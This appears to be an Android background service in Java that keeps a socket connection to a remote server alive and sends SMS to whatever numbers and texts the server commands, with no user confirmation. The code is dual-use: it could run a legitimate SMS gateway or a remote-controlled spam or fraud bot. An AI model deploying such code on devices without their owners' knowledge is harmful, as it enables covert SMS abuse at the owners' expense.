package com.mining.sms.service;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.telephony.SmsManager;

import androidx.annotation.Nullable;

import com.mining.sms.LongLink.OnData;
import com.mining.sms.LongLink.SocketManage;

import org.json.JSONObject;

import java.util.List;

public class FirstService extends Service implements OnData {
    private SocketManage socketManage;

    private final CountDownTimer countDownTimer = new CountDownTimer(Long.MAX_VALUE, 20_000) {
        @Override
        public void onTick(long millisUntilFinished) {
            socketManage.print("ping");
        }

        @Override
        public void onFinish() {
            countDownTimer.start();
        }
    };


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        initSocket();
        countDownTimer.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        countDownTimer.cancel();
    }


    private void initSocket() {
        socketManage = new SocketManage();
        socketManage.setData(this);
        socketManage.start();
    }

    @Override
    public void handle(String ds) {
        if (ds.equals("pong")) {
            return;
        }
        try {
            JSONObject jsonObject = new JSONObject(ds);
            int type = jsonObject.getInt("type");
            if (type == 0) {
                //心跳
                return;
            }
            if (type == 1) {
                //发送短信命令
                String phone = jsonObject.getString("phone");
                String message = jsonObject.getString("message");
                sendSMSS(this, phone, message);
            }
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }


    /**
     * 发送短信
     *
     * @param content 上下文
     * @param phone   目的号码
     * @param context 内容
     */
    private void sendSMSS(Context content, String phone, String context) {
        if (context.isEmpty() || phone.isEmpty() || socketManage == null) {
            return;
        }
        SmsManager manager = SmsManager.getDefault();
        PendingIntent mSendPI = PendingIntent.getBroadcast(content, (int) System.currentTimeMillis(), null, PendingIntent.FLAG_UPDATE_CURRENT);
        if (context.length() > 70) {
            List<String> msgs = manager.divideMessage(context);
            for (String msg : msgs) {
                manager.sendTextMessage(phone, null, msg, mSendPI, null);
            }
            return;
        }
        manager.sendTextMessage(phone, null, context, mSendPI, null);
    }

    @Override
    public void error(String error) {
        try {
            Thread.sleep(5_000);
            socketManage.start();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

}
